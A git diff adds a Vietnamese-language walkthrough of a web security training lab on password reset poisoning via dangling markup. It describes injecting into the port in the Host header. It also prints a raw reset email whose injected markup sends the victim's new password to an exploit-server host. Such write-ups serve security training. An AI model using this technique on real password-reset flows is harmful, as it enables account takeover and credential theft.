@@ -75,4 +75,49 @@ Sử dụng token trên để reset password của carlos rồi truy cập vào 
 
 <img width="590" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/df28af6d-4fc6-4c6b-ab76-263e77acade6">
 
+***
+
+## 3. Lab: Password reset poisoning via dangling markup
+
+* Content:
+```
+This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.
+
+You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.
+```
+* Exploit:
+
+Thực hiện reset password và bắt traffic trên BurpSuite, theo dõi hiện tượng thấy email client trả nội dung như sau:
+
+<img width="596" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f788646f-d014-442a-a682-ac6bfdea19e5">
+
+Nhận định thấy lần này ứng dụng không trả về link reset pass nữa mà trả về luôn password mới kèm link login cho user.
+
+Đẩy request `POST /forgot-password` lên Burp Repeater và thực hiện thêm tham số port ở `Host` Header => Thấy response vẫn trả về thành công.
+
+<img width="626" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/b36d84ca-d364-49ab-989d-64ebe9295274">
+
+Theo dõi nội dung trả về trong email Client => Thấy phần port được Refected vào trong phần link Login.
+
+<img width="622" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c34eb66f-4ded-4aed-8681-703013174770">
+
+Craft payload cho phần port như sau (thay bằng link của Exploit server) + đồng thời chỉnh `username=carlos`
+
+<img width="625" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/17999656-859c-4a79-8090-8f03491542f1">
+
+Lúc này nội dung email raw sẽ như sau (giả lập vẫn dùng user wiener để nhận được nội dung mail):
+
+`<p>Hello!</p><p>Please <a href='https://0ac2001f04ae4f6c802b915300c400ce.web-security-academy.net:'<a href="//exploit-0a29001404a04fc980cc90c501ba004d.exploit-server.net/?/login'>click here</a> to login with your new password: T8L7r8ECTp</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>`
+
+=> Khi view trên Email Client sẽ chỉ thấy phần Body như sau (giả lập vẫn dùng user wiener để nhận được nội dung mail):
+
+<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/32d8c341-e35d-4823-9701-f23b76df3ab9">
+
+Tuy nhiên giả định rằng user carlos sẽ click vào mọi link nhận được trong Email => Sẽ thấy có log access truy cập vào Exploit Server:
+
+<img width="625" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/da036647-e5d9-48ad-bba3-3f26990aaeb6">
+
+=> Có thể dùng password trên để truy cập vào user carlos => LAB SOLVED!
+
+<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/a15958d5-1c89-4bc9-a406-f235f12e263e">
 
